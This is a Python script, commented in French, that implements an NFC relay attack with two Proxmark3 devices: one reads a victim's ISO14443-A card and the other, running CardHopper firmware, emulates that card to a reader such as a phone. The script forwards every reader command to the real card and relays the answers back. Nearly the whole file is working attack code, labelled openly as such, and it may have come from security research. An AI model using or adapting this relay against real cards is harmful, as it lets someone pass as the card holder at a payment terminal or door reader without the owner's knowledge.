#!/usr/bin/env python3
"""
NFC Relay Attack - Proxmark3 x2 avec CardHopper
IMPORTANT: Appuyer sur le bouton du PM3 proxy AVANT de lancer ce script !

Flags confirmés depuis mifare.h :
  ISO14A_CONNECT       = (1 << 0)
  ISO14A_NO_DISCONNECT = (1 << 1)
  ISO14A_RAW           = (1 << 3)
  ISO14A_APPEND_CRC    = (1 << 5)  ← était (1<<4) avant, c'était faux !
  ISO14A_NO_RATS       = (1 << 9)

Séquence mole confirmée :
  1. CONNECT | NO_DISCONNECT | NO_RATS  → sélectionne sans RATS auto
  2. RAW | NO_DISCONNECT | APPEND_CRC + [e0 80]  → RATS manuel → ATS
  3. RAW | NO_DISCONNECT | APPEND_CRC + [cmd]    → commandes ISO14443-4
"""

import serial
import struct
import time
import sys

MOLE_PORT  = '/dev/ttyACM1'
PROXY_PORT = '/dev/ttyACM0'
BAUD = 115200

# CardHopper magic
MAGIC_CARD  = b'CARD'
MAGIC_END   = b'\xff' + b'END'
MAGIC_ERR   = b'\xff' + b'ERR'
MAGIC_RSRT  = b'RESTART'

# Flags PM3 ISO14443A - confirmés depuis mifare.h
ISO14A_CONNECT       = (1 << 0)
ISO14A_NO_DISCONNECT = (1 << 1)
ISO14A_RAW           = (1 << 3)
ISO14A_APPEND_CRC    = (1 << 5)   # ← correct !
ISO14A_NO_RATS       = (1 << 9)

# Commandes PM3
COMMANDNG_PREAMBLE_MAGIC  = 0x61334d50
COMMANDNG_POSTAMBLE_MAGIC = 0x3361
RESPONSENG_PREAMBLE_MAGIC = 0x62334d50
CMD_PING                  = 0x0109
CMD_HF_ISO14443A_READER   = 0x0385

# ── CardHopper ────────────────────────────────────────────────────────────────

def ch_send(ser, data):
    assert len(data) <= 255
    ser.write(bytes([len(data)]) + data)
    ser.flush()

def ch_recv(ser, timeout=0.1):
    deadline = time.time() + timeout
    while time.time() < deadline:
        b = ser.read(1)
        if b:
            length = b[0]
            if length == 0:
                return b''
            data = b''
            dl = time.time() + 1.0
            while len(data) < length:
                if time.time() > dl:
                    return None
                chunk = ser.read(length - len(data))
                if chunk:
                    data += chunk
            return data
    return None

# ── PM3 normal (mole) ─────────────────────────────────────────────────────────

def send_mix(ser, cmd, arg0=0, arg1=0, arg2=0, data=b''):
    payload = struct.pack('<QQQ', arg0, arg1, arg2) + data
    pkt = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, len(payload) & 0x7FFF, cmd)
    pkt += payload
    pkt += struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
    ser.write(pkt); ser.flush()

def send_ng(ser, cmd, data=b''):
    length_ng = (len(data) & 0x7FFF) | (1 << 15)
    pkt = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
    pkt += data
    pkt += struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
    ser.write(pkt); ser.flush()

def read_pm3(ser, timeout=3.0, silent=False):
    deadline = time.time() + timeout
    raw = b''
    while len(raw) < 10:
        if time.time() > deadline:
            if not silent: print("  [MOLE] TIMEOUT")
            return None
        c = ser.read(10 - len(raw))
        if c: raw += c
    magic, length_ng, cmd, status, _ = struct.unpack('<IHHBB', raw)
    if magic != RESPONSENG_PREAMBLE_MAGIC:
        ser.reset_input_buffer()
        return None
    length = length_ng & 0x7FFF
    ng_bit = (length_ng >> 15) & 1
    payload = b''
    if length > 0:
        dl = time.time() + 2.0
        while len(payload) < length and time.time() < dl:
            payload += ser.read(length - len(payload))
    ser.read(2)
    data_out = payload[24:] if not ng_bit and len(payload) >= 24 else payload
    return {'cmd': cmd, 'status': status, 'data': data_out}

def ping_mole(ser):
    d = bytes(range(32))
    send_ng(ser, CMD_PING, d)
    r = read_pm3(ser, timeout=3.0, silent=True)
    return r and r['data'] == d

def connect_tag(ser):
    """Sélectionner le tag SANS RATS automatique."""
    send_mix(ser, CMD_HF_ISO14443A_READER,
             arg0=ISO14A_CONNECT | ISO14A_NO_DISCONNECT | ISO14A_NO_RATS)
    resp = read_pm3(ser, timeout=5.0)
    if not resp or len(resp['data']) < 14:
        return None
    d = resp['data']
    uid_len = d[10]
    return {'uid': d[0:uid_len], 'atqa': d[11:13], 'sak': d[13]}

def send_rats(ser, ats_byte=0x80):
    """Envoyer RATS manuellement et récupérer l'ATS."""
    rats = bytes([0xe0, ats_byte])
    send_mix(ser, CMD_HF_ISO14443A_READER,
             arg0=ISO14A_RAW | ISO14A_NO_DISCONNECT | ISO14A_APPEND_CRC,
             arg1=len(rats), data=rats)
    resp = read_pm3(ser, timeout=3.0, silent=True)
    if not resp: return b''
    d = resp['data']
    # Extraire l'ATS (enlever les zéros de padding)
    if d and len(d) > 1 and d[0] > 0:
        ats_len = d[0]
        return d[:ats_len]
    return d[:8] if d else b''

def send_raw(ser, data):
    """Envoyer une commande RAW ISO14443-4 au tag."""
    send_mix(ser, CMD_HF_ISO14443A_READER,
             arg0=ISO14A_RAW | ISO14A_NO_DISCONNECT | ISO14A_APPEND_CRC,
             arg1=len(data), data=data)
    resp = read_pm3(ser, timeout=0.5, silent=True)
    if not resp: return None
    d = resp['data']
    if not d or len(d) == 0: return None
    if len(d) >= 200: return None
    if d == bytes(len(d)): return None
    if b'Warning' in d: return None
    # Enlever les zéros de padding en fin
    d = d.rstrip(b'\x00') if d.rstrip(b'\x00') else d[:2]
    return d if d else None

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    print("=" * 62)
    print("  NFC RELAY  |  CardHopper + PM3  |  Proxmark3 x2")
    print("  IMPORTANT: Bouton PM3 proxy pressé AVANT ce script !")
    print("=" * 62)

    mole  = serial.Serial(MOLE_PORT,  baudrate=BAUD, timeout=0.1)
    proxy = serial.Serial(PROXY_PORT, baudrate=BAUD, timeout=0.1)
    time.sleep(0.3)
    mole.reset_input_buffer();  mole.reset_output_buffer()
    proxy.reset_input_buffer(); proxy.reset_output_buffer()

    # Ping mole
    if not ping_mole(mole):
        print("[ERREUR] Mole ne répond pas !")
        return
    print("[MOLE] OK")

    # Détecter tag
    card = connect_tag(mole)
    if not card:
        print("[ERREUR] Tag non détecté !")
        return
    uid = card['uid']
    sak = card['sak']
    print(f"[MOLE] Tag : UID={uid.hex().upper()} SAK={sak:02X}")

    # Envoyer RATS au tag pour obtenir l'ATS et activer ISO14443-4
    ats = send_rats(mole)
    print(f"[MOLE] ATS : {ats.hex()}")

    # Déterminer tagtype CardHopper
    tagtype = 4 if sak == 0x20 else 2

    # ATS pour CardHopper (avec length byte en tête)
    if ats and len(ats) >= 2:
        ats_ch = ats  # déjà avec length byte
    else:
        ats_ch = bytes([0x06, 0x75, 0x80, 0x80, 0x02, 0x00])

    # Initialiser CardHopper
    print(f"\n[PROXY] CardHopper tagtype={tagtype}...")
    ch_send(proxy, MAGIC_CARD);         time.sleep(0.1); proxy.read(256)
    ch_send(proxy, bytes([tagtype]));   time.sleep(0.05); proxy.read(256)
    ch_send(proxy, bytes([0x80, 0x00]));time.sleep(0.05); proxy.read(256)
    ch_send(proxy, uid);                time.sleep(0.05); proxy.read(256)
    ch_send(proxy, ats_ch);             time.sleep(0.05); proxy.read(256)
    print("[PROXY] Prêt. Approche le téléphone !\n")
    print("=" * 62)

    n = 0
    wait = 0
    try:
        while True:
            frame = ch_recv(proxy, timeout=0.05)
            if frame is None:
                wait += 1
                if wait % 300 == 0:
                    print("  [~] En attente du lecteur...")
                continue
            wait = 0

            # Ignorer ACK, vides, zéros
            if not frame or frame == bytes(len(frame)):
                continue
            if frame[0] == 0xfe:  # ACK CardHopper
                continue

            n += 1
            print(f"\n=== #{n} LECTEUR -> {frame.hex()}")

            # RATS (e0 xx) : on a déjà envoyé RATS au tag, répondre avec notre ATS
            if frame[0] == 0xe0:
                print(f"  [RATS] -> {ats.hex()}")
                ch_send(proxy, ats)
                continue

            # DESELECT (c2) : acquitter seulement, le tag reste connecté
            if frame == b'\xc2':
                print(f"  [DESELECT] -> acquit")
                ch_send(proxy, b'\xc2')
                continue

            # Commande normale : forwarder au tag
            resp = send_raw(mole, frame)
            if resp:
                print(f"  TAG -> {resp.hex()}")
                ch_send(proxy, resp)
            else:
                print(f"  TAG -> (aucune réponse)")
                ch_send(proxy, MAGIC_ERR)

    except KeyboardInterrupt:
        print("\n[*] Arrêt.")
    finally:
        try: ch_send(proxy, MAGIC_END)
        except: pass
        mole.close(); proxy.close()
        print("[*] Ports fermés.")

if __name__ == '__main__':
    main()